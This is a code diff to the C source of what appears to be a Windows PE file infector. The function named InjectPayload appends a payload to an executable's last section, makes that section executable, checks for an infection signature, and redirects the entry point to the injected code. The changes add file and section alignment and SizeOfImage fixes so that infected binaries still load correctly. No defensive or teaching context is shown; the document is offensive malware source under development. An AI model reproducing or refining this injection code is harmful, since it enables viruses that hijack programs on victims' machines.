@@ -17,14 +17,16 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
     WORD wNbSections;
-    DWORD dwFileAlignment, dwLastSectionPtr, dwLastSectionSize, dwPayloadPtr, dwOrigEntryPoint,
-        dwNewEntryPoint, dwSignature;
+    DWORD dwFileAlignment, dwSectionAlignment, dwLastSectionPtr, dwLastSectionSize, dwPayloadPtr,
+        dwOrigEntryPoint, dwNewEntryPoint, dwSignature, dwSizeAligned;
 
     pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
     wNbSections = pNtHeader->FileHeader.NumberOfSections;
     pSection = IMAGE_FIRST_SECTION(pNtHeader);
     dwFileAlignment = pNtHeader->OptionalHeader.FileAlignment;
-    printf("File alignment: %#lx (%lu)\n", dwFileAlignment, dwFileAlignment);
+    dwSectionAlignment = pNtHeader->OptionalHeader.SectionAlignment;
+    printf("File alignment:    %#lx (%lu)\n", dwFileAlignment, dwFileAlignment);
+    printf("Section alignment: %#lx (%lu)\n", dwSectionAlignment, dwSectionAlignment);
 
     pLastSection = &pSection[wNbSections - 1];
     dwLastSectionPtr = pLastSection->PointerToRawData;
@@ -32,12 +34,13 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     dwPayloadPtr = dwLastSectionPtr + dwLastSectionSize;
     dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
     printf("Entry point: %#010lx\n", dwOrigEntryPoint);
-    printf("Last section: %s\n", pLastSection->Name);
+    printf("Last section name: %s\n", pLastSection->Name);
     printf("Last section pointer: %#010lx\n", dwLastSectionPtr);
-    printf("Last section raw size: %#lx (%lu)\n", dwLastSectionSize, dwLastSectionSize);
-    printf("Last section virtsize: %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
+    printf("Old raw size:      %#lx (%lu)\n", dwLastSectionSize, dwLastSectionSize);
+    printf("Old virtsize:      %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
            pLastSection->Misc.VirtualSize);
-    printf("Size of code: %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
+    printf("Old size of code:  %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
+    printf("Old size of image: %lu\n", pNtHeader->OptionalHeader.SizeOfImage);
 
     dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwPayloadPtr -
                              ((PCBYTE)&code_size - (PCBYTE)&signature + sizeof(code_size)));
@@ -48,16 +51,23 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
         return;
     }
 
+    dwSizeAligned = PG_ALIGN_UP(dwPayloadSize, dwFileAlignment);
+    printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);
     pLastSection->Misc.VirtualSize += dwPayloadSize;
-    // DWORD dwNewSize = PAGE_ALIGN(pLastSection->Misc.VirtualSize, dwFileAlignment);
-    // printf("New size: %#lx (%lu)\n", dwNewSize, dwNewSize);
-    pLastSection->SizeOfRawData += dwPayloadSize;
-    pNtHeader->OptionalHeader.SizeOfCode += dwPayloadSize;
-    pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
-    printf("New raw size: %#lx (%lu)\n", pLastSection->SizeOfRawData, pLastSection->SizeOfRawData);
-    printf("New virtsize: %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
+    pLastSection->SizeOfRawData += dwSizeAligned;
+    pNtHeader->OptionalHeader.SizeOfCode += pLastSection->Characteristics & IMAGE_SCN_CNT_CODE
+                                                ? dwSizeAligned
+                                                : pLastSection->SizeOfRawData;
+    pNtHeader->OptionalHeader.SizeOfImage = PG_ALIGN_UP(
+        pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwSectionAlignment);
+    pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
+    pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
+    printf("New raw size:      %#lx (%lu)\n", pLastSection->SizeOfRawData,
+           pLastSection->SizeOfRawData);
+    printf("New virtsize:      %#lx (%lu)\n", pLastSection->Misc.VirtualSize,
            pLastSection->Misc.VirtualSize);
-    printf("New size of code: %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
+    printf("New size of code:  %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
+    printf("New size of image: %lu\n", pNtHeader->OptionalHeader.SizeOfImage);
 
     dwNewEntryPoint = pLastSection->VirtualAddress + dwLastSectionSize;
     pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
@@ -105,7 +115,7 @@ int main(int argc, char* argv[]) {
 
     dwFileSize = GetFileSize(hFile, NULL);
     printf("File size: %lu bytes\n", dwFileSize);
-    DWQUAD(uliSize) = dwFileSize + dwPayloadSize;
+    DWQUAD(uliSize) = PG_ALIGN_UP(dwFileSize + PG_ALIGN_UP(dwPayloadSize, 512), 512);
 
     hMapFile = CreateFileMapping(hFile, NULL, PAGE_READWRITE, DWHILO(uliSize), NULL);
     if (hMapFile == NULL) {
